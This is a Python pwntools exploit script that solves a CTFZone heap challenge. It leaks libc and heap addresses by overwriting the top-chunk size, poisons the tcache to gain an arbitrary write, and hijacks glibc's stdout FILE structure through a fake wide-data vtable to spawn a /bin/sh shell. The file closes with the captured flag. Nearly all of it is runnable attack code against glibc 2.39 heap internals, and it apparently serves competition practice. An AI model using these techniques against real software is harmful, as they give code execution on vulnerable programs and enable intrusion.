#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
# libc = exe.libc
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]

gdbscript = '''
dir ./glibc-2.39
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or 'unfree.ctfz.zone'
    port = int(args.PORT or 17171)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr


def create(idx, size, content):
    sla(b'0. Exit', f'1 {idx} {size}'.encode())
    s(content)



def edit(idx, content):
    sla(b'0. Exit', f'2 {idx}'.encode())
    sa(b'Enter data:', content)



def read(idx):
    sla(b'0. Exit', f'3'.encode())
    sla(b'Enter index to read\n', f'{idx}'.encode())
    return rl()

PAGE_MASK = 0xfff


create(1, 0x500, b'FILLER1')

OVERWRITER_SIZE=0x400
top_size = 0x0000000000020861
create(2, OVERWRITER_SIZE, b'TOPCHUNK OVERWRITER')

top_size -= 0x10
top_size -= OVERWRITER_SIZE

new_top_size = top_size & PAGE_MASK
info(f"setting top chunk size to: {new_top_size:#x}")
edit(2, cyclic(OVERWRITER_SIZE+8)+p64(new_top_size))


# trigger free, this chunk will land in the new heap page
create(3, 0xb00, b'FILLER2 - NEWHEAPPAGE1')


# overwriter can "reach" to unsorted bin ptrs
nc = cyclic(OVERWRITER_SIZE+16)
edit(2, nc)
libc_leak = read(2)

libc_leak = libc_leak[len(nc):]
libc_leak = u64(libc_leak[:6].ljust(8, p8(0)))
assert libc_leak > 0
success(f'libc_leak: {libc_leak:#x}')

libc = exe.libc
libc.address = libc_leak -0x203b20
assert libc.address > 0
success(f'libc.address: {libc.address:#x}')


# fix chunk size
edit(2, cyclic(OVERWRITER_SIZE+8)+p64(0x0000000000000431))

create(4, 0x38, cyclic(0x10))
heap_leak = read(4)
heap_leak = heap_leak[0x10:]
heap_leak = u64(heap_leak[:6].ljust(8, p8(0)))
success(f'heap_leak: {heap_leak:#x}')

heap_base = heap_leak - 0xbb0
success(f'heap_base: {heap_base:#x}')

# consume rest of unsorted
create(5, 0x3e0, cyclic(0x10))


# now we would like to poison tcache
# need to create two chunks in tcache

top_size = 0x213f1
OVERWRITER_SIZE = 0xf8
create(6, OVERWRITER_SIZE, b'TOPCHUNK OVERWRITER2')
new_top_size = top_size & PAGE_MASK
info(f"setting top chunk size to: {new_top_size:#x}")
edit(6, cyclic(OVERWRITER_SIZE)+p64(new_top_size))
create(7, 0xb00, b'FILLER3 - NEWHEAPPAGE2')


# put second chunk into tcache 0x3d0
top_size = 0x213f1
OVERWRITER_SIZE = 0xf8
create(8, OVERWRITER_SIZE, b'TOPCHUNK OVERWRITER3')
new_top_size = top_size & PAGE_MASK
info(f"setting top chunk size to: {new_top_size:#x}")
edit(8, cyclic(OVERWRITER_SIZE)+p64(new_top_size))
create(9, 0xb00, b'FILLER4 - NEWHEAPPAGE3')

"""
pwndbg> bins
tcachebins
0x3d0 [  2]: 0x55555559fc20 —▸ 0x55555557dc20 ◂— 0
"""

# poison tcache, point next to heap_base to fully control tcache struct
mangled_ptr = protect_ptr(heap_base+0x43c20, heap_base+0x10)
edit(8, cyclic(OVERWRITER_SIZE)+p64(0x00000000000003d1)+p64(mangled_ptr))


# this chunk will be allocated at the beginning of the heap, so we control all tcache bins and their counts and ptr, so we have arb write

"""
pwndbg> vis 1

0x55555555c000	0x0000000000000000	0x0000000000000291	................	 <-- tcachebins[0x3d0][1/2]
0x55555555c010	0x0000000000000000	0x0000000000000000	................
0x55555555c020	0x0000000000000000	0x0000000000000000	................
0x55555555c030	0x0000000000000000	0x0000000000000000	................
0x55555555c040	0x0000000000000000	0x0000000000000000	................
0x55555555c050	0x0000000000000000	0x0000000000000000	................
0x55555555c060	0x0000000000000000	0x0000000000000000	................
0x55555555c070	0x0000000000000000	0x0000000000000000	................
0x55555555c080	0x0002000000000000	0x0000000000000000	................
0x55555555c090	0x0000000000000000	0x0000000000000000	................
0x55555555c0a0	0x0000000000000000	0x0000000000000000	................
0x55555555c0b0	0x0000000000000000	0x0000000000000000	................
0x55555555c0c0	0x0000000000000000	0x0000000000000000	................
0x55555555c0d0	0x0000000000000000	0x0000000000000000	................
0x55555555c0e0	0x0000000000000000	0x0000000000000000	................
0x55555555c0f0	0x0000000000000000	0x0000000000000000	................
0x55555555c100	0x0000000000000000	0x0000000000000000	................
0x55555555c110	0x0000000000000000	0x0000000000000000	................
0x55555555c120	0x0000000000000000	0x0000000000000000	................
0x55555555c130	0x0000000000000000	0x0000000000000000	................
0x55555555c140	0x0000000000000000	0x0000000000000000	................
0x55555555c150	0x0000000000000000	0x0000000000000000	................
0x55555555c160	0x0000000000000000	0x0000000000000000	................
0x55555555c170	0x0000000000000000	0x0000000000000000	................
0x55555555c180	0x0000000000000000	0x0000000000000000	................
0x55555555c190	0x0000000000000000	0x0000000000000000	................
0x55555555c1a0	0x0000000000000000	0x0000000000000000	................
0x55555555c1b0	0x0000000000000000	0x0000000000000000	................
0x55555555c1c0	0x0000000000000000	0x0000000000000000	................
0x55555555c1d0	0x0000000000000000	0x0000000000000000	................
0x55555555c1e0	0x0000000000000000	0x0000000000000000	................
0x55555555c1f0	0x0000000000000000	0x0000000000000000	................
0x55555555c200	0x0000000000000000	0x0000000000000000	................
0x55555555c210	0x0000000000000000	0x0000000000000000	................
0x55555555c220	0x0000000000000000	0x0000000000000000	................
0x55555555c230	0x0000000000000000	0x0000000000000000	................
0x55555555c240	0x0000000000000000	0x0000000000000000	................
0x55555555c250	0x0000000000000000	0x0000000000000000	................
0x55555555c260	0x0000000000000000	0x000055555559fc20	........ .YUUU..
0x55555555c270	0x0000000000000000	0x0000000000000000	................
0x55555555c280	0x0000000000000000	0x0000000000000000	................
0x55555555c290	0x0000000000000000
"""

"""
tcachebins
0x3d0 [  2]: 0x55555559fc20 —▸ 0x55555555c000 ◂— 0x55555555c
"""

# consume first chunk
create(10, 0x3c0, b'ASDF')


TCACHE_MAX_BINS = 64
def tcache_struct(idx, cnt, ptr):
    # idx0=0x20
    cnts = [p16(0) for _ in range(TCACHE_MAX_BINS)]
    ptrs = [p64(0) for _ in range(TCACHE_MAX_BINS)]
    cnts[idx] = p16(cnt)
    ptrs[idx] = p64(ptr)
    
    return b''.join(cnts) + b''.join(ptrs)



stdout = libc.symbols["_IO_2_1_stdout_"]
info(f'stdout: {stdout:#x}')


stdout_lock = libc.sym['_IO_stdfile_1_lock']
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
gadget = libc.address + 0x001791c7 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
payload = bytes(fake)

# alloc chunk in tcache_perthread_struct
idx = (len(payload) - 0x20) // 0x10
new_tcache_struct = tcache_struct(idx+1, 1, stdout)
create(11, 0x3c0, new_tcache_struct)
info(f"idx={idx:#x}")

create(12, len(payload), payload)

# CTFZone{Ev3N_1f_You_D0nT_5E3_an_OBvI0U$_3xi7_TH3re_i5_@_w4y_T0_be_free_5omEWh3rE_J@S0n_STA7H@M_9bf89b8264ffc315763e02f29167388a}

ia()
